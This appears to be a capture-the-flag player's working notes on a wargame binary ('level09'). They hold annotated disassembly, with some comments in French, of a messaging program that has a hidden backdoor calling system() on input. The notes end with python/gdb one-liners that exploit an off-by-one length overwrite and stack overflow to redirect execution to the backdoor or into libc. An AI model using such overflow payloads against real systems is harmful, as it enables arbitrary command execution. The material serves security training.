secret_backdoor:
   0x000000000000088c <+0>:	push   rbp
   0x000000000000088d <+1>:	mov    rbp,rsp
   0x0000000000000890 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000000894 <+8>:	mov    rax,QWORD PTR [rip+0x20171d]        # 0x201fb8 ; 
   0x000000000000089b <+15>:	mov    rax,QWORD PTR [rax]
   0x000000000000089e <+18>:	mov    rdx,rax
   0x00000000000008a1 <+21>:	lea    rax,[rbp-0x80]
   0x00000000000008a5 <+25>:	mov    esi,0x80
   0x00000000000008aa <+30>:	mov    rdi,rax
   0x00000000000008ad <+33>:	call   0x770 <fgets@plt> fgets(stdin, buff, 0x80)
   0x00000000000008b2 <+38>:	lea    rax,[rbp-0x80]
   0x00000000000008b6 <+42>:	mov    rdi,rax
   0x00000000000008b9 <+45>:	call   0x740 <system@plt> ; system(buff)
   0x00000000000008be <+50>:	leave
   0x00000000000008bf <+51>:	ret

set_msg:
	esp	: 0x410
		message *bufarg		: 0x408 -> 0x400
		char buffer[0x400]	: 0x400 -> 0x000
	ebp
   0x0000000000000932 <+0>:	push   %rbp
   0x0000000000000933 <+1>:	mov    %rsp,%rbp
   0x0000000000000936 <+4>:	sub    $0x410,%rsp

   0x000000000000093d <+11>:	mov    %rdi,-0x408(%rbp) ; bufarg
   0x0000000000000944 <+18>:	lea    -0x400(%rbp),%rax ; rax = buf

   0x000000000000094b <+25>:	mov    %rax,%rsi
   0x000000000000094e <+28>:	mov    $0x0,%eax
   0x0000000000000953 <+33>:	mov    $0x80,%edx
   0x0000000000000958 <+38>:	mov    %rsi,%rdi
   0x000000000000095b <+41>:	mov    %rdx,%rcx
   0x000000000000095e <+44>:	rep stos %rax,%es:(%rdi) ; memset(buffer, 0x400, \0)

   0x0000000000000961 <+47>:	lea    0x265(%rip),%rdi        # 0xbcd
   0x0000000000000968 <+54>:	callq  0x730 <puts@plt> ; puts("">: Msg @Unix-Dude"")

   0x000000000000096d <+59>:	lea    0x26b(%rip),%rax        # 0xbdf
   0x0000000000000974 <+66>:	mov    %rax,%rdi
   0x0000000000000977 <+69>:	mov    $0x0,%eax
   0x000000000000097c <+74>:	callq  0x750 <printf@plt> ; printf(">>: ");

   0x0000000000000981 <+79>:	mov    0x201630(%rip),%rax        # 0x201fb8
   0x0000000000000988 <+86>:	mov    (%rax),%rax
   0x000000000000098b <+89>:	mov    %rax,%rdx
   0x000000000000098e <+92>:	lea    -0x400(%rbp),%rax
   0x0000000000000995 <+99>:	mov    $0x400,%esi
   0x000000000000099a <+104>:	mov    %rax,%rdi
   0x000000000000099d <+107>:	callq  0x770 <fgets@plt> ; fgets(buffer, 0x400, stdin)
   0x00000000000009a2 <+112>:	mov    -0x408(%rbp),%rax ; rax = bufarg
   0x00000000000009a9 <+119>:	mov    0xb4(%rax),%eax ; eax = *(bufarg->i)
   0x00000000000009af <+125>:	movslq %eax,%rdx ; rdx = wtf sign√© en 64 bit
   0x00000000000009b2 <+128>:	lea    -0x400(%rbp),%rcx
   0x00000000000009b9 <+135>:	mov    -0x408(%rbp),%rax
   0x00000000000009c0 <+142>:	mov    %rcx,%rsi
   0x00000000000009c3 <+145>:	mov    %rax,%rdi
   0x00000000000009c6 <+148>:	callq  0x720 <strncpy@plt>; strncpy(bufarg, buffer, bufarg->wtf)
   0x00000000000009cb <+153>:	leaveq
   0x00000000000009cc <+154>:	retq

set_username:
	esp				: 0xa0
	message  *bufarg: 0x98 -> 0x90
	char buffer[]	: 0x90 -> 0x10
	int i			: 0x04 -> 0x00
	ebp


   0x00000000000009cd <+0>:	push   %rbp
   0x00000000000009ce <+1>:	mov    %rsp,%rbp
   0x00000000000009d1 <+4>:	sub    $0xa0,%rsp

   0x00000000000009d8 <+11>:	mov    %rdi,-0x98(%rbp) ; bufarg = arg (username)
   0x00000000000009df <+18>:	lea    -0x90(%rbp),%rax

   0x00000000000009e6 <+25>:	mov    %rax,%rsi
   0x00000000000009e9 <+28>:	mov    $0x0,%eax
   0x00000000000009ee <+33>:	mov    $0x10,%edx
   0x00000000000009f3 <+38>:	mov    %rsi,%rdi
   0x00000000000009f6 <+41>:	mov    %rdx,%rcx
   0x00000000000009f9 <+44>:	rep stos %rax,%es:(%rdi) ; rdi : memset(buffer, 0x10, 0)

   0x00000000000009fc <+47>:	lea    0x1e1(%rip),%rdi        # 0xbe4
   0x0000000000000a03 <+54>:	callq  0x730 <puts@plt> ; puts(">: Enter your username")

   0x0000000000000a08 <+59>:	lea    0x1d0(%rip),%rax        # 0xbdf
   0x0000000000000a0f <+66>:	mov    %rax,%rdi
   0x0000000000000a12 <+69>:	mov    $0x0,%eax
   0x0000000000000a17 <+74>:	callq  0x750 <printf@plt> ; printf(">>: ")

   0x0000000000000a1c <+79>:	mov    0x201595(%rip),%rax        # 0x201fb8
   0x0000000000000a23 <+86>:	mov    (%rax),%rax
   0x0000000000000a26 <+89>:	mov    %rax,%rdx
   0x0000000000000a29 <+92>:	lea    -0x90(%rbp),%rax
   0x0000000000000a30 <+99>:	mov    $0x80,%esi
   0x0000000000000a35 <+104>:	mov    %rax,%rdi
   0x0000000000000a38 <+107>:	callq  0x770 <fgets@plt> ; fgets(buffer, 0x80, stdin)
   0x0000000000000a3d <+112>:	movl   $0x0,-0x4(%rbp) ; i = 0
   0x0000000000000a44 <+119>:	jmp    0xa6a <set_username+157> ; 

   while (i <= 0x28 && buffer[i] != '\0')
	   0x0000000000000a46 <+121>:	mov    -0x4(%rbp),%eax ; eax = i
	   0x0000000000000a49 <+124>:	cltq 				   ; rax = i avec le signe
	   0x0000000000000a4b <+126>:	movzbl -0x90(%rbp,%rax,1),%ecx ; ecx = buffer + i
			;movzx  ecx,BYTE PTR [rbp+rax*1-0x90]
	   0x0000000000000a53 <+134>:	mov    -0x98(%rbp),%rdx ; rdx = bufarg
	   0x0000000000000a5a <+141>:	mov    -0x4(%rbp),%eax
	   0x0000000000000a5d <+144>:	cltq ; rax = i avec le sign

	   0x0000000000000a5f <+146>:	mov    %cl,0x8c(%rdx,%rax,1) ; *(bufarg + 0x8c + i) = buffer[i] || bufarg.username[i] = buffer[i]
	   		; BYTE PTR [rdx+rax*1+0x8c],cl
	   0x0000000000000a66 <+153>:	addl   $0x1,-0x4(%rbp) ; i++
	   0x0000000000000a6a <+157>:	cmpl   $0x28,-0x4(%rbp)
	   0x0000000000000a6e <+161>:	jg     0xa81 <set_username+180> ; on sort si i > 0x28

	   0x0000000000000a70 <+163>:	mov    -0x4(%rbp),%eax 
	   0x0000000000000a73 <+166>:	cltq ;rax = i avec le signe
	   0x0000000000000a75 <+168>:	movzbl -0x90(%rbp,%rax,1),%eax ; eax = buffer[i]
	   ;		movzx  eax,BYTE PTR [rbp+rax*1-0x90]
	   0x0000000000000a7d <+176>:	test   %al,%al
	   0x0000000000000a7f <+178>:	jne    0xa46 <set_username+121>
	   0x0000000000000a81 <+180>:	mov    -0x98(%rbp),%rax

   0x0000000000000a88 <+187>:	lea    0x8c(%rax),%rdx; ; 
   0x0000000000000a8f <+194>:	lea    0x165(%rip),%rax        # 0xbfb
   0x0000000000000a96 <+201>:	mov    %rdx,%rsi
   0x0000000000000a99 <+204>:	mov    %rax,%rdi
   0x0000000000000a9c <+207>:	mov    $0x0,%eax
   0x0000000000000aa1 <+212>:	callq  0x750 <printf@plt> ; printf(">: Welcome, %s", bufarg.username)
   0x0000000000000aa6 <+217>:	leaveq
   0x0000000000000aa7 <+218>:	retq


handle_msg:
	rsp			: 0xc0
	struct message	: 0xc0 -> 0x8 						   ; 0xb8 = 184

		char msg[0xc]		: 0xc0 -> 0x34 || 0x00 -> 0x8c ; 0x8c = 140
		char username[0xa8]	: 0x34 -> 0x0c || 0x8c -> 0xb4 ; 0x28 = 40
		int i				: 0xc  -> 0x08 || 0xb4 -> 0xb8 ; 0x4  = 4
	rbp

   0x00000000000008c0 <+0>:	push   %rbp
   0x00000000000008c1 <+1>:	mov    %rsp,%rbp
   0x00000000000008c4 <+4>:	sub    $0xc0,%rsp

   0x00000000000008cb <+11>:	lea    -0xc0(%rbp),%rax ; rax = buffer
   0x00000000000008d2 <+18>:	add    $0x8c,%rax ; rax = buffer.username
   0x00000000000008d8 <+24>:	movq   $0x0,(%rax) ; buffer.username = '\0'
   0x00000000000008df <+31>:	movq   $0x0,0x8(%rax) 
   0x00000000000008e7 <+39>:	movq   $0x0,0x10(%rax)
   0x00000000000008ef <+47>:	movq   $0x0,0x18(%rax)
   0x00000000000008f7 <+55>:	movq   $0x0,0x20(%rax) ; memset(buffer.username, '\0', 32)

   0x00000000000008ff <+63>:	movl   $0x8c,-0xc(%rbp) ;  buffer.i = 0x8c

   0x0000000000000906 <+70>:	lea    -0xc0(%rbp),%rax
   0x000000000000090d <+77>:	mov    %rax,%rdi
   0x0000000000000910 <+80>:	callq  0x9cd <set_username> ; set_username(&message)

   0x0000000000000915 <+85>:	lea    -0xc0(%rbp),%rax
   0x000000000000091c <+92>:	mov    %rax,%rdi
   0x000000000000091f <+95>:	callq  0x932 <set_msg> ; set_msg(buffer);

   0x0000000000000924 <+100>:	lea    0x295(%rip),%rdi        # 0xbc0
   0x000000000000092b <+107>:	callq  0x730 <puts@plt> ; puts(">: Msg sent!")
   0x0000000000000930 <+112>:	leaveq
   0x0000000000000931 <+113>:	retq

main:
   0x0000000000000aa8 <+0>:	push   %rbp
   0x0000000000000aa9 <+1>:	mov    %rsp,%rbp
   0x0000000000000aac <+4>:	lea    0x15d(%rip),%rdi        # 0xc10
   0x0000000000000ab3 <+11>:	callq  0x730 <puts@plt> ; puts('-' <repeats 44 times>, "\n|   ~Welcome to l33t-m$n ~    v1337        |\n", '-' <repeats 44 times>)
   0x0000000000000ab8 <+16>:	callq  0x8c0 <handle_msg>
   0x0000000000000abd <+21>:	mov    $0x0,%eax
   0x0000000000000ac2 <+26>:	pop    %rbp
   0x0000000000000ac3 <+27>:	retq


adresse de buffer : 0x7fffffffe500
rip de handle_msg : 0x7fffffffe5c8

valeur du rbp de handle_msg : 0x00007fffffffe5d0
emplacement : 				  0x00007fffffffe5c0


handle_msg - buffer = 0xc8 = 200

gdb /home/users/level09/level09 -ex "set args < <(python -c \"print 'a' * 0x28 + '\xff' + '\n' + 'a' * 192 + '\xd0''\xe5''\xff''\xff''\xff''\x7f''\x11''\x11' + 'b' * 8\")"
gdb /home/users/level09/level09 -ex "set args < <(python -c \"print 'a' * 0x28 + '\xff' + '\n' + 'a' * 192 + '\xd0''\xe5''\xff''\xff''\xff''\x7f''\x11''\x11' + '\x10''\x12''\xa6''\xf7''\xff''\x7f' + '\x00' * 2\")"


                                                 0x7f ff f7 a6 12 10

gdb /home/users/level09/level09 -ex "set args < <(python -c \"print 'a' * 0x28 + '\xff' + '\n' + '/bin/sh;' * 24 + '\xd0''\xe5''\xff''\xff''\xff''\x7f''\x11''\x11' + '\x8c''\x48''\x55''\x55''\x55''\x55' + '\x00' * 2\")"
/home/users/level09/level09 < <(python -c \"print 'a' * 0x28 + '\xff' + '\n' + 'a' * 192 + '\xd0''\xe5''\xff''\xff''\xff''\x7f''\x11''\x11' + '\xe4''\x10''\xa6''\xf7''\xff''\x7f' + '\x00' * 2"
																																									0x00 00 55 55 55 55 48 8c
python -c "print 'a' * 0x28 + '\xff' + '\n' + 'a' * 192 + '\xd0''\xe5''\xff''\xff''\xff''\x7f''\x11''\x11' + '\xe4''\x10''\xa6''\xf7''\xff''\x7f' + '\x00' * 2"


																0x00007ffff7b20801

																0x7ffff7a610dd															


/home/users/level09/level09 < <(python -c "print 'a' * 0x28 + '\xff' + '\n' + 'a' * 192 + '\xd0''\xe5''\xff''\xff''\xff''\x7f''\x11''\x11' + '\xdd''\x10''\xa6''\xf7''\xff''\x7f' + '\x00' * 2")"
